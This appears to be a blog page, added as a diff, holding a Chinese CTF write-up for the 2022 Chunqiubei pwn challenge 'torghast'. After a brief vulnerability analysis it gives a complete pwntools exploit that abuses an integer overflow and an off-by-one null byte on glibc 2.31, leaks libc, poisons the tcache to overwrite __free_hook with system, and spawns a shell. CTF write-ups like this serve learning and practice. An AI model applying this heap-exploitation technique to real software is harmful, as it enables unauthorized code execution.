@@ -1,0 +1,197 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>torghast - Dreamcat</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="202205 春秋杯 pwn torghast环境及保护2.31的堆题目
+1234dreamcat@ubuntu:~/Desktop/chunqiubei/pwn/torghast$ checkse,"> 
+    <meta name="author" content="dreamcat"> 
+    <link rel="alternative" href="atom.xml" title="Dreamcat" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="torghast - Dreamcat"/>
+    <meta name="twitter:description" content="202205 春秋杯 pwn torghast环境及保护2.31的堆题目
+1234dreamcat@ubuntu:~/Desktop/chunqiubei/pwn/torghast$ checkse,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="Dreamcat"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="torghast - Dreamcat"/>
+    <meta property="og:description" content="202205 春秋杯 pwn torghast环境及保护2.31的堆题目
+1234dreamcat@ubuntu:~/Desktop/chunqiubei/pwn/torghast$ checkse,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Dreamcat</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">torghast</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">torghast</h1>
+        <div class="stuff">
+            <span>五月 10, 2022</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="202205-春秋杯-pwn-torghast"><a href="#202205-春秋杯-pwn-torghast" class="headerlink" title="202205 春秋杯 pwn torghast"></a>202205 春秋杯 pwn torghast</h1><h2 id="环境及保护"><a href="#环境及保护" class="headerlink" title="环境及保护"></a>环境及保护</h2><p>2.31的堆题目</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dreamcat@ubuntu:~/Desktop/chunqiubei/pwn/torghast$ checksec --file=pwn</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE</span><br><span class="line">Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols	  No	0		2		pwn</span><br><span class="line">dreamcat@ubuntu:~/Desktop/chunqiubei/pwn/torghast$</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dreamcat@ubuntu:~/Desktop/chunqiubei/pwn/torghast$ strings libc-2.31.so | grep ubuntu</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.7) stable release version 2.31.</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+<span class="built_in">source</span>/glibc/+bugs&gt;.</span><br><span class="line">dreamcat@ubuntu:~/Desktop/chunqiubei/pwn/torghast$ </span><br></pre></td></tr></table></figure>
+
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们要想正常做堆题，就必须获得GM权限，通过use magic，造成整数溢出（将mp弄成负数），然后闯关，获得GM权限</p>
+<p>题目存在空字符的off-by-one,但是因为是高版本的glibc，就导致了修改chunksize最低位，触发unlink向前合并失效</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里检查了前chunk的size与我们释放堆块的prev_size是否相等，我i们想利用堆块合并构造overlap就无效了。一般来说绕过方式是在chunk内部伪造一个chunk,但是前提是我们可以知道堆地址。</p>
+<p>首先物品们通过unsortedbins泄露出libc以及chunksize，就可以后面继续overlap了</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/dreamcat/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getGM</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Menu&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;GM&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Menu&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;GM&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Menu&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;GM&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Menu&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;GM&quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Welcome&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;get the GM permission!!!&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Menu&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Menu&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Menu&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Menu&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">selectuser</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;User?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manage</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">back</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,text</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Id&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">if</span> size&gt;=<span class="number">1000</span>:</span><br><span class="line">        r.sendafter(<span class="string">&quot;Size&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;Size&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;Data&quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,text</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Change&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendafter(<span class="string">&quot;Log&quot;</span>,text)   </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;lete&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    back()</span><br><span class="line">    selectuser(idx)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Menu&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Log:\nXXXXXXXX&quot;</span>)</span><br><span class="line">    addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Menu&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    manage()</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line">getGM()</span><br><span class="line"><span class="comment">#leak the libc</span></span><br><span class="line"><span class="comment">#gdb.attach(r,&#x27;b malloc&#x27;)</span></span><br><span class="line">manage()</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x410</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x420</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x4f0</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x20</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x410</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x4f0</span>,<span class="string">b&#x27;e&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="string">b&#x27;X&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">b&#x27;X&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">libc = show(<span class="number">6</span>)-<span class="number">0x1ecbe0</span></span><br><span class="line">heap = show(<span class="number">5</span>)</span><br><span class="line">malloc_hook=libc +<span class="number">0x1ecb70</span></span><br><span class="line">free_hook =libc + <span class="number">0x1eee48</span></span><br><span class="line">system = libc + <span class="number">0x0522c0</span></span><br><span class="line">onegadget = <span class="number">0xcafebabedeadbeef</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc : &quot;</span>,<span class="built_in">hex</span>(libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap : &quot;</span>,<span class="built_in">hex</span>(heap))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x3f0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0x420</span>))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>)+p64(heap-<span class="number">0x420</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x3e0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x28</span>,<span class="string">b&#x27;x&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x20</span>,p64(system))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="false"
+        data-ae="false"
+        data-ci=""
+        data-cs=""
+        data-r=""
+        data-o=""
+        data-a=""
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#202205-%E6%98%A5%E7%A7%8B%E6%9D%AF-pwn-torghast"><span class="toc-number">1.</span> <span class="toc-text">202205 春秋杯 pwn torghast</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%8A%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.1.</span> <span class="toc-text">环境及保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.4.</span> <span class="toc-text">exp:</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
